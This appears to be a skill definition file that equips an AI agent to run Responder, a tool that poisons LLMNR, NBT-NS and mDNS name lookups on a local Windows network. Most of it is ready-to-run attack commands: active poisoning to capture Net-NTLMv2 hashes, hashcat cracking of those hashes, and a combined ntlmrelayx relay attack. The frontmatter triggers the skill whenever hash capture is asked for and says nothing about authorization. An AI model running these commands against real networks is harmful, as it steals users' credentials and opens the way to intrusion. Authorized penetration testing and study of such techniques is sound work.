---
name: responder
description: "NBT-NS, LLMNR, and mDNS poisoner that captures Net-NTLMv2 hashes from Windows hosts on the local network. Use when asked to capture NTLM hashes, poison name resolution, perform NTLM relay attacks, set up a rogue SMB/HTTP server for credential capture, or collect hashes for offline cracking."
license: GPL-3.0
compatibility: "Linux. Install: git clone https://github.com/lgandx/Responder (apt install responder on Kali). Must be on same network segment as targets. Requires root."
metadata:
  author: AeonDave
  version: "1.0"
---

# Responder

LLMNR/NBT-NS/mDNS poisoner — captures Net-NTLMv2 hashes from Windows hosts on local network.

## Concept

When a Windows host tries to resolve a hostname that DNS cannot answer, it falls back to LLMNR/NBT-NS broadcast. Responder answers those broadcasts with its own IP, causing the Windows host to authenticate — Responder captures the Net-NTLMv2 hash.

## Quick Start

```bash
# Start passively (analyze mode — no poisoning)
sudo responder -I eth0 -A

# Active poisoning (captures hashes)
sudo responder -I eth0 -wv

# Captured hashes saved to:
# /usr/share/responder/logs/ or ~/.responder/logs/
```

## Core Flags

| Flag | Description |
|------|-------------|
| `-I <iface>` | Network interface |
| `-A` | Analyze mode — no poisoning |
| `-w` | Enable WPAD rogue proxy server |
| `-d` | Enable DHCP poisoning |
| `-b` | Enable Basic HTTP auth capture |
| `-v` | Verbose (show each request) |
| `-f` | Fingerprint hosts |
| `--lm` | Downgrade auth to LM (legacy) |
| `--disable-ess` | Disable extended session security |
| `--lm` | Force LM hashing |
| `-r` | Enable WINS server |
| `--no-multirelay` | Disable relay mode |

## Rogue Servers Enabled by Default

`SMB`, `HTTP`, `HTTPS`, `FTP`, `DNS`, `LDAP`, `MSSQL`, `NTLMv1`, `NTLMv2`

## Common Workflows

```bash
# Passive capture — wait for Windows hosts to broadcast
sudo responder -I eth0 -wv

# View captured hashes in real-time
tail -f /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Crack captured hashes
hashcat -a 0 -m 5600 hashes.txt rockyou.txt

# Disable SMB + HTTP for relay (if using ntlmrelayx in parallel)
# Edit /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off
sudo responder -I eth0 -wv

# Combined relay attack:
# Terminal 1: ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support

# Terminal 2: Responder (SMB+HTTP off)
sudo responder -I eth0 -wv
```

## Captured Hash Format

```
[SMB] NTLMv2 Hash    : DOMAIN\user::DOMAIN:challenge:hash:blob
```

Crack with hashcat mode `5600` (Net-NTLMv2) or pass via relay.

## Resources

| File | When to load |
|------|--------------|
| `references/ntlm-relay.md` | Full relay chain: ntlmrelayx setup, LDAP relay, SMB signing bypass, RBCD |

## Structuring This Skill
